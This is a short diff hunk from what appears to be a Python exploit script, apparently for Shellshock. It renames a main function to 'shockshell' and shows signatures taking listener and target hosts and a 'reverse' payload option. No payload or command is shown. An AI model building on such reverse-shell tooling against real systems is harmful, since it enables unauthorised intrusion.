@@ -53,7 +53,7 @@ def exploit(lhost,lport,rhost,rport,payload,pages):
 			break
 		time.sleep(1)
 
-def main(payload,lhost,lport,rhost):
+def shockshell(payload,lhost,lport,rhost):
 
 	if payload == 'reverse':
 		try:
